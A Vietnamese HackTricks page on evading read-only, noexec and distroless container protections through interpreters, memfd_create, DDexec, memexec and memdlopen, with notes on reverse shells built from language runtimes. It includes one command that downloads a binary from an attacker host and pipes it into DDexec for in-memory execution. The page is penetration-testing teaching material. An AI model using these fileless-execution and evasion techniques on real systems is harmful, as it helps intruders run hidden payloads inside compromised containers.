# Vượt qua các biện pháp bảo vệ FS: read-only / no-exec / Distroless

{{#include ../../../../banners/hacktricks-training.md}}

## Videos

Trong các video sau, bạn có thể tìm hiểu chi tiết hơn về các kỹ thuật được đề cập trên trang này:<sup>[[1]](#references)[[2]](#references)</sup>

- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4).<sup>[[1]](#references)</sup>
- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU).<sup>[[2]](#references)</sup>

## Tình huống read-only / no-exec

Trong container, bạn có thể mount root filesystem ở chế độ read-only bằng cách đặt **`readOnlyRootFilesystem: true`** trong security context.<sup>[[3]](#references)</sup> Ví dụ:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
  name: alpine-pod
spec:
  containers:
  - name: alpine
    image: alpine
    securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Root filesystem ở chế độ read-only không khiến các volume được mount riêng cũng chuyển sang read-only. Docker xem **`/dev/shm`** là một IPC mount, còn các tùy chọn tmpfs như `rw` và `noexec` là lựa chọn cấu hình lúc chạy; hãy kiểm tra tùy chọn mount của container mục tiêu trước khi dựa vào một trong hai hành vi này.<sup>[[4]](#references)[[5]](#references)</sup>

> [!WARNING]
> Từ góc độ red-team, sự kết hợp này có thể gây khó khăn khi tải xuống và thực thi các binary chưa có sẵn (ví dụ: backdoor hoặc công cụ enumeration).<sup>[[4]](#references)[[5]](#references)</sup>

## Cách bypass đơn giản nhất: Scripts

Mount `noexec` chặn việc thực thi trực tiếp các binary trên mount đó, nhưng interpreter vẫn có thể đọc và diễn giải một script. Vì vậy, nếu có `sh` hoặc `python`, bạn có thể chạy shell script hoặc Python script thông qua interpreter tương ứng.<sup>[[5]](#references)</sup>

Cách này không hữu ích khi chính công cụ cần dùng là một binary.<sup>[[5]](#references)</sup>

## Bypass bằng memory

Khi không thể thực thi trực tiếp từ một đường dẫn đã mount, một lựa chọn là nạp ELF vào memory rồi thực thi thông qua một đường dẫn trong memory. Cách này tránh kiểm tra `noexec` trên mount đó, nhưng không loại bỏ các biện pháp kiểm soát khác của kernel, quyền hạn hoặc policy.<sup>[[5]](#references)[[6]](#references)</sup>

### Bypass bằng FD + exec syscall

Nếu scripting runtime có thể truy cập interface Linux liên quan, nó có thể tạo một file descriptor ẩn danh, được hỗ trợ bởi RAM bằng **`memfd_create(2)`**, ghi các byte ELF vào đó rồi sử dụng đường dẫn thực thi dựa trên fd. Dự án [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) tạo mã Python, Perl hoặc Ruby được nén và mã hóa base64 cho quy trình này.<sup>[[6]](#references)[[7]](#references)</sup>

Hiện dự án chỉ tài liệu hóa các target Python, Perl và Ruby; PHP hoặc Node cần kỹ thuật hoặc phần mở rộng riêng cho runtime, vì vậy việc không có generator cho một ngôn ngữ không có nghĩa là không thể thực thi trong memory.<sup>[[6]](#references)[[12]](#references)</sup>

Xem [Linux Fileless Execution](../../../post-exploitation/linux-fileless-execution.md) để tìm hiểu rộng hơn về thực thi file ẩn danh, các mẫu staging liên quan, cũng như việc phát hiện và thu thập dữ liệu pháp chứng.

> [!WARNING]
> Một executable thông thường được ghi vào **`/dev/shm`** vẫn chịu ảnh hưởng của thiết lập **`noexec`** trên mount đó; chỉ mở file bằng file descriptor thông thường không làm thay đổi policy của mount.<sup>[[5]](#references)</sup>
>
> Phương pháp thực thi trong memory cụ thể cũng phụ thuộc vào runtime, kiến trúc, kernel và quyền hạn hiện có.<sup>[[6]](#references)[[7]](#references)[[12]](#references)</sup>

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) ghi stager và loader vào tiến trình shell đang chạy thông qua **`/proc/self/mem`**, sau đó chuyển quyền điều khiển sang đoạn mã đó.<sup>[[8]](#references)</sup>

Nhờ vậy, tiến trình có thể nạp một binary được cung cấp mà không cần ghi binary đó trước vào filesystem có quyền thực thi.<sup>[[8]](#references)</sup>

> [!TIP]
> **DDexec / EverythingExec** có thể nạp và **thực thi** shellcode hoặc binary từ **memory**.<sup>[[8]](#references)</sup>

```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```

Để biết thêm thông tin về kỹ thuật này, hãy xem Github hoặc:

{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) là một triển khai DDexec chạy dưới dạng daemon. Daemon lắng nghe các yêu cầu chứa tham số và byte thô của chương trình, tạo tiến trình con để tải và chạy từng chương trình, đồng thời giữ tiến trình cha làm máy chủ.<sup>[[9]](#references)</sup>

Repository có ví dụ sử dụng **memexec để thực thi binary từ PHP reverse shell** trong [a.php](https://github.com/arget13/memexec/blob/main/a.php).<sup>[[9]](#references)</sup>

### Memdlopen

Có mục đích tương tự DDexec, [**memdlopen**](https://github.com/arget13/memdlopen) là một triển khai `dlopen()` không dùng file dành cho shared object hoặc chương trình. README hiện ghi nhận hỗ trợ ARM64, vì vậy hãy kiểm tra kiến trúc mục tiêu trước khi sử dụng.<sup>[[10]](#references)</sup>

## Bypass Distroless

Để tìm hiểu riêng **distroless thực chất là gì**, khi nào nó hữu ích, khi nào không, và nó thay đổi tradecraft hậu khai thác trong container như thế nào, hãy xem:

{{#ref}}
../../../containers-namespaces/container-security/distroless.md
{{#endref}}

### Distroless là gì

Image distroless chỉ chứa ứng dụng và các dependency runtime của nó; các image chính thức không có package manager, shell và những chương trình khác thường có trong một bản phân phối Linux tiêu chuẩn.<sup>[[11]](#references)</sup>

Việc giới hạn image runtime ở các dependency đó giúp giảm lượng phần mềm có mặt trong môi trường production, cũng như giảm lượng phần mềm cần được quét và theo dõi.<sup>[[11]](#references)</sup>

### Reverse Shell

Trong container distroless, bạn có thể **không tìm thấy `sh` hoặc `bash`** để mở shell thông thường, cũng như các tiện ích phổ biến như `ls`, `whoami` hoặc `id`.<sup>[[11]](#references)</sup>

> [!WARNING]
> Vì vậy, Reverse Shell thông thường dựa trên shell hoặc việc dò tìm dựa trên tiện ích có thể không hoạt động.<sup>[[11]](#references)</sup>

Nếu ứng dụng bị xâm nhập có chứa runtime của một ngôn ngữ (ví dụ: Python cho ứng dụng Flask hoặc Node.js cho ứng dụng Node), RCE vẫn có thể sử dụng runtime đó để tạo kênh lệnh và kiểm tra hệ thống thông qua các API của nó.<sup>[[11]](#references)[[12]](#references)</sup>

> [!TIP]
> Sử dụng ngôn ngữ lập trình có sẵn để **dò tìm hệ thống** bằng các khả năng của ngôn ngữ đó.<sup>[[12]](#references)</sup>

Nếu không có các biện pháp bảo vệ **read-only/no-exec**, một kênh lệnh có thể ghi binary vào mount có quyền ghi và thực thi, rồi chạy chúng; trước tiên hãy xác minh các tùy chọn mount và quyền truy cập.<sup>[[4]](#references)[[5]](#references)</sup>

> [!TIP]
> Khi có các biện pháp bảo vệ này, hãy sử dụng **các kỹ thuật thực thi trong bộ nhớ ở trên** nếu runtime, kernel và quyền cho phép.<sup>[[6]](#references)[[8]](#references)[[10]](#references)</sup>

Bạn có thể tìm thấy **ví dụ** khai thác lỗ hổng RCE để tạo **Reverse Shell** bằng ngôn ngữ lập trình và thực thi binary từ bộ nhớ trong [**DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).<sup>[[12]](#references)</sup>

## References

- [1] [DEF CON 31 - Khám phá thao tác bộ nhớ Linux để ẩn mình và né tránh](https://www.youtube.com/watch?v=poHirez8jk4)
- [2] [Xâm nhập ẩn mình bằng DDexec-ng và dlopen() trong bộ nhớ - HackTricks Track 2023](https://www.youtube.com/watch?v=VM_gjjiARaU)
- [3] [Cấu hình Security Context cho Pod hoặc Container](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [4] [docker container run](https://docs.docker.com/reference/cli/docker/container/run)
- [5] [mount(8) - Trang hướng dẫn sử dụng Linux](https://man7.org/linux/man-pages/man8/mount.8.html)
- [6] [fileless-elf-exec](https://github.com/nnsee/fileless-elf-exec)
- [7] [memfd_create(2) - Trang hướng dẫn sử dụng Linux](https://man7.org/linux/man-pages/man2/memfd_create.2.html)
- [8] [DDexec](https://github.com/arget13/DDexec)
- [9] [memexec](https://github.com/arget13/memexec)
- [10] [memdlopen](https://github.com/arget13/memdlopen)
- [11] [GoogleContainerTools/distroless](https://github.com/GoogleContainerTools/distroless)
- [12] [DistrolessRCE](https://github.com/carlospolop/DistrolessRCE)
{{#include ../../../../banners/hacktricks-training.md}}
